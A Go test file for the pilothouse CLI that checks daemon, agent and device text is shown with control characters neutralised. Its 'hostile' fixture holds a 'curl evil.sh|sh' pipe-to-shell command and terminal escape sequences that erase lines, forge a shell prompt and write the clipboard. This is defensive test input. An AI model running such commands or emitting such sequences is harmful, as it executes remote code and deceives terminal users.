package cli

// Tests that nothing an agent, a tool, a paired device or another machine
// wrote reaches the terminal as a control character. Helpers are prefixed
// "hst".

import (
	"encoding/json"
	"io"
	"net"
	"net/http"
	"net/http/httptest"
	"os"
	"path/filepath"
	"reflect"
	"strings"
	"testing"
	"time"

	"github.com/sabr-software/pilothouse/internal/adapters"
	"github.com/sabr-software/pilothouse/internal/api"
	"github.com/sabr-software/pilothouse/internal/termsafe"
	"github.com/sabr-software/pilothouse/internal/version"
)

// hostile erases the line it is printed on, draws "$ ls -la" in its
// place, writes the clipboard (OSC 52) and hides what follows; then the
// same with a C1 CSI, a bidi override, DEL, a bare carriage return and a
// line of its own.
const hostile = "curl evil.sh|sh \x1b[2K\x1b[1G$ ls -la \x1b]52;c;ZXZpbA==\x07\x1b[8m\u009b2K\u202e\x7f\rdone\n$ forged"

// hstInert fails when out holds anything a terminal would act on.
func hstInert(t *testing.T, what, out string) bool {
	t.Helper()
	for _, r := range out {
		if r != '\n' && r != '\t' && termsafe.Unsafe(r) {
			t.Errorf("%s: U+%04X reaches the terminal:\n%q", what, r, out)
			return false
		}
	}
	return true
}

func TestOneLineTextShowsControlCharacters(t *testing.T) {
	got := oneLineText(hostile)
	hstInert(t, "oneLineText", got)
	if want := "curl evil.sh|sh ␛[2K␛[1G$ ls -la ␛]52;c;ZXZpbA==␇␛[8m<U+009B>2K<U+202E>␡ done $ forged"; got != want {
		t.Errorf("oneLineText:\n got %q\nwant %q", got, want)
	}
	req := api.Request{Command: hostile}
	if got := inboxRequestWhat(req); !hstInert(t, "inboxRequestWhat", got) || !strings.Contains(got, "curl evil.sh|sh ␛[2K") {
		t.Errorf("inboxRequestWhat: %q", got)
	}
	req = api.Request{Tool: "Edit" + hostile, Paths: []string{"/tmp/x" + hostile, "b"}}
	hstInert(t, "inboxRequestWhat paths", inboxRequestWhat(req))
	hstInert(t, "inboxWhere", inboxWhere(api.Session{Title: hostile, Branch: hostile}, ""))
	hstInert(t, "inboxWhere cwd", inboxWhere(api.Session{}, "/src/"+hostile))
}

// hstGen makes API values in which every string is hostile, so a field
// added later is covered without a new fixture. enums gives the
// enumerations a valid value (the commands then take their usual paths);
// ids makes the ids hostile too.
type hstGen struct {
	enums map[reflect.Type]string
	ids   bool
	fail  bool // every route answers 400 with a hostile message
}

func (g hstGen) fill(v reflect.Value, name string, depth int) {
	if depth > 8 {
		return
	}
	switch v.Kind() {
	case reflect.String:
		e, isEnum := g.enums[v.Type()]
		switch {
		case isEnum:
			v.SetString(e)
		case !g.ids && (strings.HasSuffix(name, "ID") || name == "Name" && g.enums != nil):
			v.SetString("id1")
		default:
			v.SetString(name + hostile)
		}
	case reflect.Bool:
		v.SetBool(true)
	case reflect.Int, reflect.Int64, reflect.Int32:
		v.SetInt(1)
	case reflect.Float64:
		v.SetFloat(1.5)
	case reflect.Pointer:
		v.Set(reflect.New(v.Type().Elem()))
		g.fill(v.Elem(), name, depth+1)
	case reflect.Struct:
		if v.Type() == reflect.TypeOf(time.Time{}) {
			v.Set(reflect.ValueOf(ibxT0.Add(-time.Minute)))
			return
		}
		for i := 0; i < v.NumField(); i++ {
			if f := v.Type().Field(i); f.IsExported() {
				g.fill(v.Field(i), f.Name, depth+1)
			}
		}
	case reflect.Slice:
		if v.Type().Elem().Kind() == reflect.Uint8 { // raw JSON
			b, _ := json.Marshal(map[string]string{"command": hostile, "file_path": hostile, "rule": hostile, "summary": hostile})
			v.SetBytes(b)
			return
		}
		v.Set(reflect.MakeSlice(v.Type(), 2, 2))
		for i := 0; i < 2; i++ {
			g.fill(v.Index(i), name, depth+1)
		}
	case reflect.Map:
		if v.Type().Key().Kind() != reflect.String {
			return
		}
		v.Set(reflect.MakeMap(v.Type()))
		k := reflect.New(v.Type().Key()).Elem()
		k.SetString("k")
		if g.ids {
			k.SetString("k" + hostile)
		}
		e := reflect.New(v.Type().Elem()).Elem()
		g.fill(e, name, depth+1)
		v.SetMapIndex(k, e)
	}
}

func (g hstGen) value(sample any) any {
	v := reflect.New(reflect.TypeOf(sample))
	g.fill(v.Elem(), "", 0)
	switch x := v.Interface().(type) {
	case *api.Health:
		x.Protocol = api.ProtocolVersion
		if g.enums != nil {
			x.Version = version.Version
		}
	case *[]api.Event:
		*x = g.events()
	}
	return v.Interface()
}

// events is one event of every type, each with the data that type has.
func (g hstGen) events() []api.Event {
	data := map[api.EventType]any{
		api.EventSessionStarted: api.Session{}, api.EventSessionUpdated: api.Session{}, api.EventSessionExited: api.Session{},
		api.EventRequestOpened: api.Request{}, api.EventRequestClosed: api.Request{},
		api.EventPolicyDecision:                  map[string]string{},
		api.EventPresenceChanged:                 api.Presence{},
		api.EventDeviceChanged:                   api.Device{},
		api.EventTaskUpdated:                     api.Task{},
		api.EventSessionReply:                    api.ReplyRecord{},
		api.EventPolicyChanged:                   map[string]string{},
		api.EventHook:                            adapters.HookEvent{},
		api.EventMachineChanged:                  api.MachineInfo{},
		api.EventType("made.up" + hostile):       map[string]string{},
		api.EventType("request.closed" + "\x7f"): api.Request{},
	}
	var out []api.Event
	seq := int64(100)
	for typ, sample := range data {
		var raw []byte
		if m, ok := sample.(map[string]string); ok {
			for _, k := range []string{"rule", "action", "outcome", "summary", "tool", "name", "op", "by", "message", "source"} {
				m[k] = k + hostile
			}
			raw, _ = json.Marshal(m)
		} else if s, ok := sample.(string); ok {
			raw, _ = json.Marshal(s)
		} else {
			raw, _ = json.Marshal(g.value(sample))
		}
		seq++
		ev := api.Event{Seq: seq, At: ibxT0, Type: typ, SessionID: "id1", RequestID: "id1", Data: raw}
		if g.ids {
			ev.SessionID, ev.RequestID = "s"+hostile, "r"+hostile
		}
		out = append(out, ev)
	}
	// And one whose data isn't what its type says.
	odd, _ := json.Marshal("not an object" + hostile)
	out = append(out, api.Event{Seq: seq + 1, At: ibxT0, Type: api.EventRequestOpened, SessionID: "id1", Data: odd})
	return out
}

// hstStart serves the daemon's API on the test socket, answering every
// route with generated values.
func hstStart(t *testing.T, g hstGen) {
	t.Helper()
	run := ibxEnv(t)
	routes := map[string]any{
		"GET /v1/health": api.Health{}, "GET /v1/snapshot": api.Snapshot{},
		"GET /v1/sessions": []api.Session{}, "GET /v1/sessions/{id}": api.Session{},
		"GET /v1/sessions/{id}/events": []api.Event{}, "GET /v1/sessions/{id}/explain": api.Explain{},
		"GET /v1/sessions/{id}/activity": api.Activity{}, "POST /v1/sessions/{id}/reply": api.ReplyResult{},
		"GET /v1/requests": []api.Request{}, "GET /v1/requests/{id}": api.Request{},
		"POST /v1/requests/{id}/decide": api.Request{}, "GET /v1/requests/{id}/suggestions": []api.RuleSuggestion{},
		"GET /v1/presence": api.Presence{}, "PUT /v1/presence": api.Presence{},
		"GET /v1/tasks": []api.Task{}, "GET /v1/tasks/{id}": api.Task{}, "POST /v1/tasks": api.Task{},
		"POST /v1/tasks/start": api.Task{}, "GET /v1/tasks/{id}/diff": api.TaskDiff{}, "POST /v1/tasks/{id}/finish": api.Task{},
		"GET /v1/policy/status": api.PolicyStatus{}, "POST /v1/policy/reload": api.PolicyStatus{},
		"POST /v1/pair": api.PairStart{}, "POST /v1/login-link": api.LoginLink{}, "GET /v1/devices": []api.Device{},
		"GET /v1/events":     []api.Event{},
		"POST /v1/link/code": api.LinkCode{}, "POST /v1/link/join": api.LinkJoined{}, "GET /v1/link": api.LinkStatus{},
		"DELETE /v1/link/{id}": api.LinkPeer{},
		"GET /v1/insights":     api.Insights{}, "GET /v1/rules": api.RulesView{}, "POST /v1/rules": api.RuleInfo{},
		"POST /v1/rules/test": api.RuleTestResult{}, "GET /v1/repos": []api.RepoInfo{},
	}
	mux := http.NewServeMux()
	for pattern, sample := range routes {
		mux.HandleFunc(pattern, func(w http.ResponseWriter, r *http.Request) {
			if g.fail {
				ibxError(w, 400, "invalid", "refused"+hostile)
				return
			}
			if strings.HasSuffix(r.URL.Path, "/events") && r.URL.Query().Get("after") != "" && r.URL.Query().Get("after") != "0" {
				ibxJSON(w, []api.Event{}) // one page is enough
				return
			}
			ibxJSON(w, g.value(sample))
		})
	}
	mux.HandleFunc("/", func(w http.ResponseWriter, r *http.Request) {
		if g.fail {
			ibxError(w, 400, "invalid", "refused"+hostile)
			return
		}
		_, _ = io.WriteString(w, "{}")
	})
	ln, err := net.Listen("unix", filepath.Join(run, "pilothouse.sock"))
	if err != nil {
		t.Fatal(err)
	}
	if err := os.Chmod(filepath.Join(run, "pilothouse.sock"), 0o600); err != nil {
		t.Fatal(err)
	}
	srv := httptest.NewUnstartedServer(mux)
	srv.Listener = ln
	srv.Start()
	t.Cleanup(srv.Close)
}

// hstCommands are the commands that print what the daemon holds. shown
// marks those whose normal output quotes it, where the stand-in for the
// escape character must be visible.
var hstCommands = []struct {
	args  []string
	stdin string
	shown bool
}{
	{args: []string{"ls"}, shown: true},
	{args: []string{"ls", "--all"}, shown: true},
	{args: []string{"ls", "--json"}},
	{args: []string{"approve", "id1"}, shown: true},
	{args: []string{"approve", "id1", "--session"}, shown: true},
	{args: []string{"deny", "id1", "-m", "no"}, shown: true},
	{args: []string{"answer", "id1"}, shown: true},
	{args: []string{"answer", "id1", "1"}},
	{args: []string{"answer", "id1", "--approve"}},
	{args: []string{"answer", "id1", "--reject", "no"}},
	{args: []string{"reply", "id1", "go on"}},
	{args: []string{"log"}, shown: true},
	{args: []string{"log", "--json"}},
	{args: []string{"log", "--session", "id1"}, shown: true},
	{args: []string{"explain", "id1"}, shown: true},
	{args: []string{"explain", "id1", "--json"}},
	{args: []string{"status"}},
	{args: []string{"status", "--json"}},
	{args: []string{"here"}},
	{args: []string{"away"}},
	{args: []string{"auto"}},
	{args: []string{"usage"}, shown: true},
	{args: []string{"usage", "--json"}},
	{args: []string{"activity", "id1"}, shown: true},
	{args: []string{"activity", "id1", "--json"}},
	{args: []string{"activity", "id1", "--catch-up"}, shown: true},
	{args: []string{"devices"}, shown: true},
	{args: []string{"devices", "--json"}},
	{args: []string{"devices", "revoke", "id1"}},
	{args: []string{"pair", "--no-qr"}},
	{args: []string{"pair", "--json"}},
	{args: []string{"link", "ls"}, shown: true},
	{args: []string{"link", "ls", "--json"}},
	{args: []string{"link", "add"}},
	{args: []string{"link", "add", "--json"}},
	{args: []string{"link", "join", "https://hub.example", "123456"}, stdin: "y\n", shown: true},
	{args: []string{"link", "trust"}, stdin: "y\n"},
	{args: []string{"link", "remove", "id1"}},
	{args: []string{"policy", "status"}, shown: true},
	{args: []string{"policy", "status", "--json"}},
	{args: []string{"policy", "rules"}, shown: true},
	{args: []string{"policy", "rules", "--json"}},
	{args: []string{"policy", "preset"}, shown: true},
	{args: []string{"policy", "preset", "id1"}},
	{args: []string{"policy", "preset", "id1", "on"}},
	{args: []string{"policy", "test", "git push"}},
	{args: []string{"policy", "test", "--json", "git push"}},
	{args: []string{"policy", "replay"}},
	{args: []string{"policy", "replay", "--all"}},
	{args: []string{"policy", "add", "no-push", "--deny", "--command", "git push*"}},
	{args: []string{"policy", "enable", "id1"}},
	{args: []string{"policy", "remove", "id1"}},
	{args: []string{"policy", "reload"}},
	{args: []string{"notify", "test"}},
	{args: []string{"doctor"}},
	{args: []string{"doctor", "--json"}},
	{args: []string{"version"}},
}

func hstEnums(checkpoint api.Checkpoint) map[reflect.Type]string {
	return map[reflect.Type]string{
		reflect.TypeOf(api.RequestStatus("")): string(api.RequestOpen),
		reflect.TypeOf(api.Checkpoint("")):    string(checkpoint),
		reflect.TypeOf(api.State("")):         string(api.StateBlocked),
		reflect.TypeOf(api.BlockKind("")):     string(api.BlockPermission),
		reflect.TypeOf(api.Mode("")):          string(api.ModeObserved),
		reflect.TypeOf(api.AgentKind("")):     string(api.AgentClaude),
		reflect.TypeOf(api.Behavior("")):      string(api.BehaviorDeny),
		reflect.TypeOf(api.PresenceState("")): string(api.PresenceAway),
		reflect.TypeOf(api.PresenceMode("")):  string(api.PresenceAuto),
		reflect.TypeOf(api.TaskStatus("")):    string(api.TaskReview),
		reflect.TypeOf(api.ActivityKind("")):  string(api.ActivityTool),
	}
}

func TestNoControlCharacterReachesTheTerminal(t *testing.T) {
	for _, tc := range []struct {
		name string
		gen  hstGen
	}{
		{"permission", hstGen{enums: hstEnums(api.CheckpointPermission)}},
		{"question", hstGen{enums: hstEnums(api.CheckpointQuestion)}},
		{"plan", hstGen{enums: hstEnums(api.CheckpointPlan)}},
		{"hostile ids and enumerations", hstGen{ids: true}},
		{"refused by the daemon", hstGen{fail: true}},
	} {
		t.Run(tc.name, func(t *testing.T) {
			hstStart(t, tc.gen)
			quoted := 0
			for _, c := range hstCommands {
				what := "pilothouse " + strings.Join(c.args, " ")
				out, err := ibxRun(t, c.stdin, c.args...)
				hstInert(t, what, out)
				if strings.Contains(out, "\n$ forged") {
					t.Errorf("%s: a line break in a field starts a line of its own:\n%s", what, out)
				}
				if strings.Contains(out, "␛") || strings.Contains(out, `\u001b`) {
					quoted++
				} else if c.shown && tc.gen.enums != nil && err == nil {
					t.Errorf("%s: the hostile text should be shown, with ␛ for the escape character (%v):\n%s", what, err, out)
				}
				if testing.Verbose() {
					t.Logf("%s: err=%q\n%s", what, termsafe.Text(errString(err)), out)
				}
			}
			if !tc.gen.fail && quoted < 20 {
				t.Errorf("only %d commands showed the daemon's text: the test no longer reaches them", quoted)
			}
		})
	}
}

func errString(err error) string {
	if err == nil {
		return ""
	}
	return err.Error()
}

// Main prints the error of a failed command: the daemon's message in it
// is not ours.
func TestMainEscapesTheErrorItPrints(t *testing.T) {
	hstStart(t, hstGen{fail: true})
	r, w, err := os.Pipe()
	if err != nil {
		t.Fatal(err)
	}
	saved := os.Stderr
	os.Stderr = w
	code := Main([]string{"deny", "r_1", "-m", "no"})
	os.Stderr = saved
	w.Close()
	b, _ := io.ReadAll(r)
	out := string(b)
	if code != 1 || !strings.Contains(out, "pilothouse: ") || !strings.Contains(out, "refused") {
		t.Fatalf("exit %d: %q", code, out)
	}
	hstInert(t, "the error line", out)
	if !strings.Contains(out, "␛[2K") {
		t.Errorf("the message should be shown with its control characters visible: %q", out)
	}
}
